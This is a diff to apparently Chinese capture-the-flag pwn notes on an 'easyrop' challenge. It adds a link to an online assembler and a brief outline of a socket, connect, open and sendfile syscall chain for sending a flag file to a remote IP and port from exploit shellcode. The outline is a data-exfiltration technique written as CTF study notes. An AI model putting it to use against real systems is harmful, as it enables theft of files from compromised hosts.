@@ -1031,6 +1031,8 @@ p.interactive()
 
 ## easyrop(2.27/IO全关+监听式orw+自建gadget)
 
+[shell-storm Online Assembler and Disassembler](https://shell-storm.org/online/Online-Assembler-and-Disassembler/)
+
 pwnhub上的一道题，题目情况如图，未开pie，got表可写
 
 ![image-20220517095419337](https://e4l4pic.oss-cn-beijing.aliyuncs.com/img/image-20220517095419337.png)
@@ -1163,4 +1165,14 @@ p.interactive()
 ```
 
 ![image-20220517101711344](https://e4l4pic.oss-cn-beijing.aliyuncs.com/img/image-20220517101711344.png)
+
+### socket+connect+open+sendfile
+
+0 = socket(1,2,0)
+
+fffffxxx(负数) = connect(0，[ip:socket]_addr,0x10)
+
+1 = open(flag_addr,0,fffffxxx(负数) )
+
+sendfile(fffffxxx(负数) ,1,可写入地址，size(r10))
 
